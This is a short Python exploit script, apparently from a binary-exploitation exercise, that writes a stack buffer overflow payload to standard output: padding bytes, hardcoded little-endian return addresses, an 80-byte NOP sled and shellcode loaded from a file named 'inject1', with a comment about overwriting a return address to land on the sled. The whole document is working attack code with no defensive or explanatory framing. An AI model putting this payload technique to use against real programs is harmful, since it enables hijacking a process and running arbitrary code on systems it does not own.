import sys





sys.stdout.write('A' * 20)
sys.stdout.write('\x0f\xd8\xff\xff')
sys.stdout.write('ABCDEFGHIJKL')

sys.stdout.write('\x4d\xd6\xff\xff')
sys.stdout.write('\x90' * 80)
with open('inject1', 'r') as fin:
    sys.stdout.write(fin.read())
#sys.stdout.write()




# need to overwrite 0x080484cd, the return -> throw onto nop slide
